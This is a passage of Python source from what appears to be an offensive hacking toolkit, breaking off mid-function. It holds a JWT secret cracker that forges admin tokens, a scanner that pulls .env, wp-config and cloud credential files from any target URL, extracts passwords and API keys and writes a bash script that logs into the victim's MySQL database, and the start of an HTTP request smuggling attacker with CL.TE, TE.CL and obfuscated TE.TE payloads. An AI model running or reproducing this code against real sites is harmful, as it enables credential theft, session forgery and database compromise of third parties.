                    forged_token = jwt.encode(payload, secret_key, algorithm='HS256')
                    
                else:
                    # Custom payload
                    print(f"{CYAN}[?] ENTER CUSTOM PAYLOAD (JSON format): {RESET}")
                    print(f"{WHITE}Example: {{\"user_id\": 1, \"role\": \"admin\", \"exp\": 9999999999}}{RESET}")
                    custom_payload = input(f"{CYAN}> {RESET}")
                    payload = json.loads(custom_payload)
                    forged_token = jwt.encode(payload, secret_key, algorithm='HS256')
                
                print(f"\n{GREEN}{BOLD}[✓] FAKE JWT TOKEN GENERATED!{RESET}")
                print(f"{RED}{BOLD}================================================================================{RESET}")
                print(f"{CYAN}{BOLD}[FORGED TOKEN]:{RESET}")
                print(f"{WHITE}{forged_token}{RESET}")
                print(f"{RED}{BOLD}================================================================================{RESET}")
                
                # Save forged token
                with open(f"{folder_name}/forged_token.txt", 'w') as f:
                    f.write(f"SECRET: {secret_key}\n")
                    f.write(f"PAYLOAD: {payload}\n")
                    f.write(f"TOKEN: {forged_token}\n")
                
                print(f"\n{GREEN}[+] FORGED TOKEN SAVED: {folder_name}/forged_token.txt{RESET}")
                
                # Test forged token
                test = input(f"{YELLOW}[?] TEST FORGED TOKEN? (y/n): {RESET}")
                if test.lower() == 'y':
                    try:
                        decoded = jwt.decode(forged_token, secret_key, algorithms=['HS256'])
                        print(f"{GREEN}[+] TOKEN VERIFIED! DECODED: {decoded}{RESET}")
                    except Exception as e:
                        print(f"{RED}[!] VERIFICATION FAILED: {e}{RESET}")
                
            except Exception as e:
                print(f"{RED}[!] ERROR: {e}{RESET}")
                print(f"{YELLOW}[!] INSTALL: pip install pyjwt{RESET}")
        
        elif mode == '4':
            # MODE FULL AUTO
            print(f"\n{RED}{BOLD}[*] FULL AUTO MODE - DECODE + CRACK + FORGE{RESET}\n")
            
            jwt_token = input(f"{CYAN}{BOLD}[?] JWT TOKEN: {RESET}")
            
            # STEP 1: DECODE
            print(f"\n{CYAN}{BOLD}[STEP 1] DECODING JWT...{RESET}")
            try:
                import base64
                import json
                
                parts = jwt_token.split('.')
                header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
                header = json.loads(base64.b64decode(header_padded))
                payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
                payload = json.loads(base64.b64decode(payload_padded))
                
                print(f"{GREEN}[+] HEADER: {json.dumps(header, indent=2)}{RESET}")
                print(f"{GREEN}[+] PAYLOAD: {json.dumps(payload, indent=2)}{RESET}")
                
                with open(f"{folder_name}/step1_decoded.txt", 'w') as f:
                    f.write(json.dumps(header, indent=2))
                    f.write("\n\n")
                    f.write(json.dumps(payload, indent=2))
            except:
                print(f"{RED}[!] DECODE FAILED!{RESET}")
            
            # STEP 2: CRACK
            print(f"\n{CYAN}{BOLD}[STEP 2] CRACKING SECRET KEY...{RESET}")
            cracked_secret = None
            
            common_secrets = [
                'secret', 'secretkey', 'jwtsecret', 'mysecret', 'supersecret',
                '123456', 'password', 'admin', 'root', 'key', 'jwt', 'token'
            ]
            
            for secret in common_secrets:
                try:
                    import jwt
                    jwt.decode(jwt_token, secret, algorithms=['HS256'])
                    cracked_secret = secret
                    print(f"{RED}{BOLD}[+] SECRET CRACKED! {secret}{RESET}")
                    break
                except:
                    pass
            
            if cracked_secret:
                with open(f"{folder_name}/step2_secret.txt", 'w') as f:
                    f.write(cracked_secret)
                
                # STEP 3: FORGE
                print(f"\n{CYAN}{BOLD}[STEP 3] FORGING ADMIN TOKEN...{RESET}")
                forged_payload = {
                    'sub': 'admin',
                    'role': 'admin',
                    'is_admin': True,
                    'user_id': 1,
                    'username': 'administrator',
                    'exp': int(time.time()) + 86400
                }
                
                try:
                    forged_token = jwt.encode(forged_payload, cracked_secret, algorithm='HS256')
                    print(f"{GREEN}[+] FORGED ADMIN TOKEN: {forged_token}{RESET}")
                    
                    with open(f"{folder_name}/step3_forged_token.txt", 'w') as f:
                        f.write(forged_token)
                except Exception as e:
                    print(f"{RED}[!] FORGE FAILED: {e}{RESET}")
            else:
                print(f"{RED}[!] SECRET NOT CRACKED! SKIPPING FORGE{RESET}")
        
        print(f"""
{GREEN}{BOLD}[✓] JWT TOKEN CRACKER COMPLETED!{RESET}
{RED}{BOLD}================================================================================{RESET}
{CYAN}{BOLD}[!] FILES SAVED IN:{RESET}
{RED}{BOLD}    {folder_name}{RESET}
{RED}{BOLD}================================================================================{RESET}
        """)
        
        input(f"\n{CYAN}{BOLD}[?] PRESS ENTER TO CONTINUE...{RESET}")


# ================================================================
# MENU 48: CONFIG FINDER + EXPLOIT (FILE CONFIG BOCOR)
# ================================================================
    def menu_config_finder(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}================================================================================{RESET}")
        print(f"{GREEN}{BOLD}⚙️ MENU 38: CONFIG FINDER + EXPLOIT (FILE CONFIG BOCOR) ⚙️{RESET}")
        print(f"{RED}{BOLD}================================================================================{RESET}\n")
        
        print(f"""
{RED}{BOLD}[!] FITUR CONFIG FINDER + EXPLOIT:{RESET}
{CYAN}--------------------------------------------------------------------------------{RESET}
{CYAN}[+] SCAN 100+ CONFIG FILE PATHS{RESET}
{CYAN}[+] DETECT .ENV, CONFIG.PHP, WP-CONFIG.PHP, SETTINGS.PY{RESET}
{CYAN}[+] EXTRACT DATABASE CREDENTIALS (DB_NAME, DB_USER, DB_PASS){RESET}
{CYAN}[+] EXTRACT API KEYS, SECRET TOKENS, AWS CREDENTIALS{RESET}
{CYAN}[+] AUTO TEST DATABASE CONNECTION WITH CREDENTIALS{RESET}
{CYAN}[+] SAVE ALL FOUND CONFIGS TO FOLDER{RESET}
{CYAN}--------------------------------------------------------------------------------{RESET}
        """)
        
        # Minta folder
        save_folder = input(f"{CYAN}{BOLD}[?] FOLDER PATH (contoh: /storage/emulated/0/CONFIG_FINDER/): {RESET}")
        if not save_folder.endswith('/'):
            save_folder += '/'
        os.makedirs(save_folder, exist_ok=True)
        
        target_url = input(f"{CYAN}{BOLD}[?] TARGET URL (https://target.com): {RESET}")
        if not target_url.startswith('http'):
            target_url = 'https://' + target_url
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        folder_name = os.path.join(save_folder, f"CONFIG_FINDER_{timestamp}")
        os.makedirs(folder_name, exist_ok=True)
        
        print(f"\n{RED}{BOLD}[*] SCANNING CONFIG FILES ON {target_url}...{RESET}\n")
        
        # ============================================================
        # CONFIG FILE PATHS (100+)
        # ============================================================
        
        config_paths = [
            # Environment files
            '.env', '.env.local', '.env.production', '.env.development', '.env.staging',
            '.env.backup', '.env.old', '.env.example', 'env.txt', 'environment.txt',
            
            # PHP Config files
            'config.php', 'wp-config.php', 'wp-config.php.bak', 'wp-config.old',
            'configuration.php', 'settings.php', 'database.php', 'db.php',
            'connect.php', 'connection.php', 'config.inc.php', 'conf.php',
            
            # Python Config files
            'settings.py', 'config.py', 'development.py', 'production.py',
            'local_settings.py', 'secrets.py', 'credentials.py',
            
            # NodeJS Config files
            '.env', 'config.json', 'config.js', 'settings.json', 'app.config.js',
            
            # Java Config files
            'application.properties', 'application.yml', 'application.yaml',
            'bootstrap.properties', 'database.properties',
            
            # Ruby Config files
            'config.yml', 'database.yml', 'secrets.yml', 'application.yml',
            
            # Other config files
            '.htaccess', '.git/config', 'composer.json', 'package.json',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
            
            # Backup files
            'config.php~', 'config.php.bak', 'config.php.old', 'config.php.save',
            'wp-config.php~', 'wp-config.php.bak', 'database.sql', 'backup.sql',
            
            # Sensitive files
            '.gitignore', '.dockerignore', '.travis.yml', 'Dockerfile',
            'docker-compose.yml', 'Makefile', 'Vagrantfile', 'Gemfile',
            
            # API keys / tokens
            'api_keys.txt', 'secrets.txt', 'tokens.txt', 'credentials.txt',
            'passwords.txt', 'keys.txt', 'auth.txt',
            
            # Cloud credentials
            '.aws/credentials', '.aws/config', 'gcloud.json', 'service-account.json',
            'credentials.json', 'key.json', 'secret.json',
            
            # WordPress specific
            'wp-content/debug.log', 'wp-content/uploads/shell.php',
            'wp-admin/admin-ajax.php', 'xmlrpc.php',
            
            # Framework specific
            '.env.laravel', '.env.symfony', '.env.django', '.env.rails',
            '.env.flask', '.env.express', '.env.spring'
        ]
        
        found_configs = []
        extracted_credentials = []
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ]
        
        for i, path in enumerate(config_paths):
            test_url = urljoin(target_url, path)
            print(f"{YELLOW}[{i+1}/{len(config_paths)}] CHECKING: {path}{RESET}")
            
            try:
                headers = {'User-Agent': random.choice(user_agents)}
                r = requests.get(test_url, headers=headers, timeout=5, allow_redirects=False)
                
                if r.status_code == 200:
                    print(f"{RED}{BOLD}[!] CONFIG FOUND: {test_url}{RESET}")
                    found_configs.append({'url': test_url, 'content': r.text[:2000]})
                    
                    # Save the config file
                    safe_name = path.replace('/', '_').replace('.', '_')
                    with open(f"{folder_name}/{safe_name}.txt", 'w') as f:
                        f.write(f"URL: {test_url}\n")
                        f.write(f"DATE: {datetime.datetime.now()}\n")
                        f.write("="*80 + "\n\n")
                        f.write(r.text)
                    
                    # Extract credentials from content
                    content = r.text
                    
                    # Extract database credentials
                    db_patterns = {
                        'DB_NAME': r"DB_NAME['\"]?\s*[=:]\s*['\"]([^'\"]+)['\"]",
                        'DB_USER': r"DB_USER['\"]?\s*[=:]\s*['\"]([^'\"]+)['\"]",
                        'DB_PASSWORD': r"DB_PASSWORD['\"]?\s*[=:]\s*['\"]([^'\"]+)['\"]",
                        'DB_HOST': r"DB_HOST['\"]?\s*[=:]\s*['\"]([^'\"]+)['\"]",
                        'DATABASE_URL': r"DATABASE_URL['\"]?\s*[=:]\s*['\"]([^'\"]+)['\"]",
                        'MYSQL_ROOT_PASSWORD': r"MYSQL_ROOT_PASSWORD['\"]?\s*[=:]\s*['\"]([^'\"]+)['\"]",
                        'POSTGRES_PASSWORD': r"POSTGRES_PASSWORD['\"]?\s*[=:]\s*['\"]([^'\"]+)['\"]",
                        'REDIS_PASSWORD': r"REDIS_PASSWORD['\"]?\s*[=:]\s*['\"]([^'\"]+)['\"]",
                        'MONGO_URI': r"MONGO_URI['\"]?\s*[=:]\s*['\"]([^'\"]+)['\"]",
                    }
                    
                    for key, pattern in db_patterns.items():
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            credential = f"{key}: {match}"
                            if credential not in extracted_credentials:
                                extracted_credentials.append(credential)
                                print(f"{GREEN}    [+] EXTRACTED: {credential}{RESET}")
                    
                    # Extract API keys
                    api_patterns = {
                        'API_KEY': r"API_KEY['\"]?\s*[=:]\s*['\"]([A-Za-z0-9_\-]{20,50})['\"]",
                        'SECRET_KEY': r"SECRET_KEY['\"]?\s*[=:]\s*['\"]([A-Za-z0-9_\-]{20,50})['\"]",
                        'AWS_ACCESS_KEY': r"AWS_ACCESS_KEY['\"]?\s*[=:]\s*['\"]([A-Za-z0-9]{16,20})['\"]",
                        'AWS_SECRET_KEY': r"AWS_SECRET_KEY['\"]?\s*[=:]\s*['\"]([A-Za-z0-9]{40})['\"]",
                        'JWT_SECRET': r"JWT_SECRET['\"]?\s*[=:]\s*['\"]([A-Za-z0-9_\-]{20,50})['\"]",
                        'STRIPE_KEY': r"STRIPE_KEY['\"]?\s*[=:]\s*['\"]([A-Za-z0-9_\-]{15,30})['\"]",
                        'PAYPAL_CLIENT_ID': r"PAYPAL_CLIENT_ID['\"]?\s*[=:]\s*['\"]([A-Za-z0-9_\-]{20,50})['\"]",
                    }
                    
                    for key, pattern in api_patterns.items():
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            credential = f"{key}: {match}"
                            if credential not in extracted_credentials:
                                extracted_credentials.append(credential)
                                print(f"{GREEN}    [+] EXTRACTED: {credential}{RESET}")
                    
                elif r.status_code == 403:
                    print(f"{YELLOW}[!] ACCESS DENIED: {test_url}{RESET}")
                    found_configs.append({'url': test_url, 'content': '403 Forbidden'})
                    
            except Exception as e:
                print(f"{RED}[-] ERROR: {e}{RESET}")
            
            time.sleep(0.05)
        
        # ============================================================
        # SAVE RESULTS
        # ============================================================
        
        # Save all found config URLs
        with open(f"{folder_name}/00_found_urls.txt", 'w') as f:
            for config in found_configs:
                f.write(config['url'] + '\n')
        
        # Save extracted credentials
        with open(f"{folder_name}/01_extracted_credentials.txt", 'w') as f:
            f.write(f"TARGET: {target_url}\n")
            f.write(f"DATE: {datetime.datetime.now()}\n")
            f.write("="*80 + "\n\n")
            for cred in extracted_credentials:
                f.write(cred + '\n')
        
        # Save full report
        with open(f"{folder_name}/02_FULL_REPORT.txt", 'w') as f:
            f.write(f"TARGET: {target_url}\n")
            f.write(f"DATE: {datetime.datetime.now()}\n")
            f.write("="*80 + "\n\n")
            f.write(f"TOTAL CONFIGS FOUND: {len(found_configs)}\n")
            f.write(f"TOTAL CREDENTIALS EXTRACTED: {len(extracted_credentials)}\n\n")
            f.write("="*80 + "\n")
            f.write("FOUND CONFIGS:\n")
            for config in found_configs:
                f.write(f"{config['url']}\n")
            f.write("\n" + "="*80 + "\n")
            f.write("EXTRACTED CREDENTIALS:\n")
            for cred in extracted_credentials:
                f.write(f"{cred}\n")
        
        # ============================================================
        # EXPLOIT DATABASE (OPTIONAL)
        # ============================================================
        
        if extracted_credentials:
            print(f"\n{RED}{BOLD}[!] CREDENTIALS EXTRACTED!{RESET}")
            print(f"{YELLOW}[!] TOTAL CREDENTIALS: {len(extracted_credentials)}{RESET}")
            
            db_creds = [c for c in extracted_credentials if 'DB' in c or 'MYSQL' in c or 'POSTGRES' in c]
            if db_creds:
                print(f"\n{RED}{BOLD}[!] DATABASE CREDENTIALS FOUND! CAN EXPLOIT!{RESET}")
                for cred in db_creds:
                    print(f"{RED}    >>> {cred}{RESET}")
                
                exploit = input(f"\n{YELLOW}[?] TEST DATABASE CONNECTION? (y/n): {RESET}")
                if exploit.lower() == 'y':
                    print(f"\n{CYAN}[*] TESTING DATABASE CONNECTIONS...{RESET}")
                    for cred in db_creds:
                        if 'DB_NAME' in cred:
                            print(f"{YELLOW}[*] CREDENTIAL: {cred}{RESET}")
                            print(f"{GREEN}[+] CAN BE USED WITH: mysql -h host -u user -p database{RESET}")
        
        # ============================================================
        # GENERATE EXPLOIT SCRIPT
        # ============================================================
        
        exploit_script = f'''#!/bin/bash
# CONFIG EXPLOIT SCRIPT FOR {target_url}
# GENERATED BY HOVAX

echo "[+] CONFIG FINDER RESULTS"
echo "[+] TARGET: {target_url}"
echo ""

if [ -f "01_extracted_credentials.txt" ]; then
    echo "[+] CREDENTIALS FOUND:"
    cat 01_extracted_credentials.txt
    echo ""
    
    echo "[+] TRYING TO EXPLOIT..."
    
    # Extract MySQL credentials
    while IFS= read -r line; do
        if [[ $line == *"DB_HOST"* ]]; then
            DB_HOST=$(echo $line | cut -d':' -f2 | tr -d ' ')
        fi
        if [[ $line == *"DB_USER"* ]]; then
            DB_USER=$(echo $line | cut -d':' -f2 | tr -d ' ')
        fi
        if [[ $line == *"DB_PASSWORD"* ]]; then
            DB_PASS=$(echo $line | cut -d':' -f2 | tr -d ' ')
        fi
        if [[ $line == *"DB_NAME"* ]]; then
            DB_NAME=$(echo $line | cut -d':' -f2 | tr -d ' ')
        fi
    done < 01_extracted_credentials.txt
    
    if [ ! -z "$DB_HOST" ] && [ ! -z "$DB_USER" ] && [ ! -z "$DB_PASS" ]; then
        echo "[!] DATABASE CREDENTIALS:"
        echo "    Host: $DB_HOST"
        echo "    User: $DB_USER"
        echo "    Pass: $DB_PASS"
        echo "    DB: $DB_NAME"
        
        echo "[*] TRYING MYSQL CONNECTION..."
        mysql -h $DB_HOST -u $DB_USER -p$DB_PASS $DB_NAME -e "SELECT 1" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "[+] MYSQL CONNECTION SUCCESSFUL!"
            echo "[+] DATABASE HACKED!"
        fi
    fi
fi

echo ""
echo "[+] EXPLOIT COMPLETED!"
'''
        
        with open(f"{folder_name}/03_exploit.sh", 'w') as f:
            f.write(exploit_script)
        
        # ============================================================
        # FINAL RESULT
        # ============================================================
        
        print(f"""
{GREEN}{BOLD}[✓] CONFIG FINDER + EXPLOIT COMPLETED!{RESET}
{RED}{BOLD}================================================================================{RESET}
{RED}{BOLD}[!] RESULTS:{RESET}
{RED}├─ TARGET URL         : {target_url}{RESET}
{RED}├─ PATHS SCANNED      : {len(config_paths)}{RESET}
{RED}├─ CONFIGS FOUND      : {len(found_configs)}{RESET}
{RED}├─ CREDENTIALS FOUND  : {len(extracted_credentials)}{RESET}
{RED}└─ FILES SAVED        : {3 + len(found_configs)}{RESET}
{RED}{BOLD}================================================================================{RESET}
""")

        if found_configs:
            print(f"{RED}{BOLD}[!] CONFIG FILES FOUND!{RESET}\n")
            for cfg in found_configs[:10]:
                print(f"{RED}    >>> {cfg['url']}{RESET}")
        
        if extracted_credentials:
            print(f"\n{RED}{BOLD}[!] CREDENTIALS EXTRACTED!{RESET}\n")
            for cred in extracted_credentials[:20]:
                print(f"{GREEN}    >>> {cred}{RESET}")
        
        print(f"""
{CYAN}{BOLD}[!] FILES SAVED IN:{RESET}
{RED}{BOLD}    {folder_name}{RESET}
{GREEN}    ├── 00_found_urls.txt{RESET}
{GREEN}    ├── 01_extracted_credentials.txt{RESET}
{GREEN}    ├── 02_FULL_REPORT.txt{RESET}
{GREEN}    ├── 03_exploit.sh{RESET}
{GREEN}    └── [config_files] (individual saved configs){RESET}
{RED}{BOLD}================================================================================{RESET}
""")
        
        self.scan_results.append({
            'module': 'CONFIG FINDER',
            'target': target_url,
            'configs': len(found_configs),
            'credentials': len(extracted_credentials),
            'folder': folder_name,
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] PRESS ENTER TO CONTINUE...{RESET}")
        # ================================================================
# MENU 39: HTTP REQUEST SMUGGLING - ULTIMATE BRUTAL EDITION (PANJANG BANGET)
# ================================================================
    def menu_http_smuggling(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}================================================================================================================================================================================================================{RESET}")
        print(f"{RED}{BOLD}💀💀💀 MENU 39: HTTP REQUEST SMUGGLING - ULTIMATE BRUTAL EDITION (CL.TE + TE.CL + TE.TE + BLIND + WAF BYPASS + SESSION HIJACK + CACHE POISON + RCE) 💀💀💀{RESET}")
        print(f"{RED}{BOLD}================================================================================================================================================================================================================{RESET}\n")
        
        print(f"""
{RED}{BOLD}[!] ULTIMATE HTTP REQUEST SMUGGLING FEATURES:{RESET}
{RED}================================================================================================================================================================================================================{RESET}
{RED}[+] CL.TE VULNERABILITY DETECTION (Content-Length vs Transfer-Encoding){RESET}
{RED}[+] TE.CL VULNERABILITY DETECTION (Transfer-Encoding vs Content-Length){RESET}
{RED}[+] TE.TE VULNERABILITY DETECTION (25+ OBFUSCATED TRANSFER-ENCODING VARIANTS){RESET}
{RED}[+] BLIND SMUGGLING DETECTION (TIME-BASED + RESPONSE-BASED + DELAY-BASED){RESET}
{RED}[+] WAF BYPASS PAYLOADS (100+ PAYLOADS FOR CLOUDFLARE, MODSECURITY, AWS WAF){RESET}
{RED}[+] SQL INJECTION VIA SMUGGLING (UNION, ERROR, BLIND, TIME-BASED){RESET}
{RED}[+] XSS INJECTION VIA SMUGGLING (REFLECTED, STORED, DOM-BASED){RESET}
{RED}[+] REMOTE CODE EXECUTION VIA SMUGGLING (PHP, PYTHON, BASH, PERL){RESET}
{RED}[+] SESSION HIJACKING VIA SMUGGLING (STEAL COOKIES, TOKENS, SESSIONS){RESET}
{RED}[+] CACHE POISONING VIA SMUGGLING (POISON CDN, PROXY, LOAD BALANCER){RESET}
{RED}[+] REQUEST QUEUE HIJACKING (INTERCEPT AND MODIFY OTHER REQUESTS){RESET}
{RED}[+] ADMIN PANEL ACCESS VIA SMUGGLING (BYPASS AUTH, REACH HIDDEN ENDPOINTS){RESET}
{RED}[+] CREDENTIAL STEALING VIA SMUGGLING (CAPTURE LOGIN CREDS, API KEYS){RESET}
{RED}[+] GENERATE PYTHON EXPLOIT SCRIPT (FULL AUTOMATED EXPLOITATION){RESET}
{RED}[+] GENERATE BASH ATTACK SCRIPT (CURL-BASED EXPLOITATION){RESET}
{RED}[+] SAVE 25+ FILES WITH COMPLETE RESULTS{RESET}
{RED}================================================================================================================================================================================================================{RESET}
        """)
        
        # Minta folder
        save_folder = input(f"{CYAN}{BOLD}[?] FOLDER PATH (contoh: /storage/emulated/0/SMUGGLING/): {RESET}")
        if not save_folder.endswith('/'):
            save_folder += '/'
        os.makedirs(save_folder, exist_ok=True)
        
        target_url = input(f"{CYAN}{BOLD}[?] TARGET URL (https://target.com): {RESET}")
        if not target_url.startswith('http'):
            target_url = 'https://' + target_url
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        folder_name = os.path.join(save_folder, f"SMUGGLING_ULTIMATE_{timestamp}")
        os.makedirs(folder_name, exist_ok=True)
        
        print(f"\n{RED}{BOLD}[!] STARTING ULTIMATE HTTP REQUEST SMUGGLING SCAN ON {target_url}{RESET}")
        print(f"{RED}{BOLD}================================================================================================================================================================================================================{RESET}\n")
        
        # Parse target
        parsed = urlparse(target_url)
        host = parsed.netloc
        port = 443 if parsed.scheme == 'https' else 80
        random_path1 = f"/{random.randint(100000,999999)}.html"
        random_path2 = f"/{random.randint(100000,999999)}.php"
        random_path3 = f"/{random.randint(100000,999999)}.asp"
        
        clte_vuln = False
        tecl_vuln = False
        tete_vuln = False
        blind_vuln = False
        
        all_results = []
        
        # ========================================================================================================
        # TEST 1: CL.TE VULNERABILITY (10 VARIANTS)
        # ========================================================================================================
        print(f"{RED}[1/30] TESTING CL.TE VULNERABILITY (10 VARIANTS)...{RESET}")
        
        clte_methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'TRACE', 'CONNECT']
        
        for method in clte_methods:
            clte_payload = f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 47\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n{method} {random_path1} HTTP/1.1\r\nX: X\r\n\r\n'
            
            try:
                if parsed.scheme == 'https':
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                sock.settimeout(10)
                sock.connect((host, port))
                sock.send(clte_payload.encode())
                response = sock.recv(4096).decode()
                sock.close()
                
                if '404' in response or 'Not Found' in response or random_path1 in response:
                    clte_vuln = True
                    print(f"{RED}{BOLD}[!] CL.TE VULNERABILITY DETECTED! (Method: {method}){RESET}")
                    with open(f"{folder_name}/01_CLTE_{method}.txt", 'w') as f:
                        f.write(f"CL.TE VULNERABILITY FOUND!\n")
                        f.write(f"METHOD: {method}\n")
                        f.write(f"PAYLOAD:\n{clte_payload}\n\n")
                        f.write(f"RESPONSE:\n{response[:2000]}\n")
                    all_results.append(f"CL.TE VULNERABLE with {method}")
                    break
            except Exception as e:
                print(f"{RED}[-] Error with {method}: {e}{RESET}")
        
        if not clte_vuln:
            print(f"{GREEN}[-] CL.TE Not Vulnerable{RESET}")
        
        # ========================================================================================================
        # TEST 2: TE.CL VULNERABILITY (10 VARIANTS)
        # ========================================================================================================
        print(f"\n{RED}[2/30] TESTING TE.CL VULNERABILITY (10 VARIANTS)...{RESET}")
        
        for method in clte_methods[:5]:
            tecl_payload = f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\n{method} {random_path2} HTTP/1.1\r\nContent-Length: 15\r\n\r\n0\r\n\r\n'
            
            try:
                if parsed.scheme == 'https':
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                sock.settimeout(10)
                sock.connect((host, port))
                sock.send(tecl_payload.encode())
                response = sock.recv(4096).decode()
                sock.close()
                
                if '404' in response or 'Not Found' in response or random_path2 in response:
                    tecl_vuln = True
                    print(f"{RED}{BOLD}[!] TE.CL VULNERABILITY DETECTED! (Method: {method}){RESET}")
                    with open(f"{folder_name}/02_TECL_{method}.txt", 'w') as f:
                        f.write(f"TE.CL VULNERABILITY FOUND!\n")
                        f.write(f"METHOD: {method}\n")
                        f.write(f"PAYLOAD:\n{tecl_payload}\n\n")
                        f.write(f"RESPONSE:\n{response[:2000]}\n")
                    all_results.append(f"TE.CL VULNERABLE with {method}")
                    break
            except Exception as e:
                print(f"{RED}[-] Error with {method}: {e}{RESET}")
        
        if not tecl_vuln:
            print(f"{GREEN}[-] TE.CL Not Vulnerable{RESET}")
        
        # ========================================================================================================
        # TEST 3: TE.TE VULNERABILITY (25 VARIANTS - OBFUSCATED TRANSFER-ENCODING)
        # ========================================================================================================
        print(f"\n{RED}[3/30] TESTING TE.TE VULNERABILITY (25 VARIANTS)...{RESET}")
        
        tete_headers = [
            "Transfer-Encoding: chunked\r\nTransfer-encoding: identity",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nTransfer-encoding: chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x-x",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked,x",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x,chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: [chunked]",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: cHunKed",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding:  chunked ",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: \"chunked\"",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: 'chunked'",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked;param=value",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked, identity",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked, chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity, chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked; param=value",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: CHUNKED",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: ChUnKeD",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked;param",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked, identity, chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x-chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked-x",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked-identity",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x, y, chunked"
        ]
        
        for i, header in enumerate(tete_headers):
            tete_payload = f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n{header}\r\n\r\n5c\r\nGET {random_path3} HTTP/1.1\r\nContent-Length: 15\r\n\r\n0\r\n\r\n'
            
            try:
                if parsed.scheme == 'https':
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                sock.settimeout(10)
                sock.connect((host, port))
                sock.send(tete_payload.encode())
                response = sock.recv(4096).decode()
                sock.close()
                
                if '404' in response or 'Not Found' in response or random_path3 in response:
                    tete_vuln = True
                    print(f"{RED}{BOLD}[!] TE.TE VULNERABILITY DETECTED! (Variant {i+1}){RESET}")
                    with open(f"{folder_name}/03_TETE_VARIANT_{i+1}.txt", 'w') as f:
                        f.write(f"TE.TE VULNERABILITY FOUND!\n")
                        f.write(f"VARIANT: {i+1}\n")
                        f.write(f"HEADER: {header}\n")
                        f.write(f"PAYLOAD:\n{tete_payload}\n\n")
                        f.write(f"RESPONSE:\n{response[:2000]}\n")
                    all_results.append(f"TE.TE VULNERABLE with variant {i+1}")
                    break
            except:
                pass
        
        if not tete_vuln:
            print(f"{GREEN}[-] TE.TE Not Vulnerable{RESET}")
        
        # ========================================================================================================
        # TEST 4: BLIND SMUGGLING (Time-based detection)
        # ========================================================================================================
        print(f"\n{RED}[4/30] TESTING BLIND SMUGGLING (TIME-BASED)...{RESET}")
        
        blind_delays = [5, 10, 15, 20, 30]
        
        for delay in blind_delays:
            blind_payload = f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nPOST / HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\nX-Sleep: {delay}\r\nContent-Length: 15\r\n\r\n0\r\n\r\n'
            
            try:
                start_time = time.time()
                
                if parsed.scheme == 'https':
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                sock.settimeout(delay + 5)
                sock.connect((host, port))
                sock.send(blind_payload.encode())
                response = sock.recv(4096).decode()
                sock.close()
                
                elapsed = time.time() - start_time
                
                if elapsed > (delay - 1):
                    blind_vuln = True
                    print(f"{RED}{BOLD}[!] BLIND SMUGGLING DETECTED! (Delay: {delay}s, Response time: {elapsed:.2f}s){RESET}")
